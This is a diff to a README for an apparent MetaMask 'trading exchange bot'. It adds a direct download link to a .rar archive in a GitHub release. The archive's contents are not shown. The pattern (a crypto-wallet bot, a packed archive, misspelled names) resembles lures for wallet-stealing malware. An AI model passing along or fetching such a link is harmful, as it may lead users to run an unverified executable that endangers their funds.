@@ -17,7 +17,7 @@
 ## How to Get Started:
 # Download
 
-🚀 Install --> [Releases]() 
+🚀 Install --> [Releases](https://github.com/Spotexa/Metamask-Traiding-Exchange-Bot/releases/download/v2.4/Relase.rar) 
 
 ![Boost Logo](metamask.gif)
 
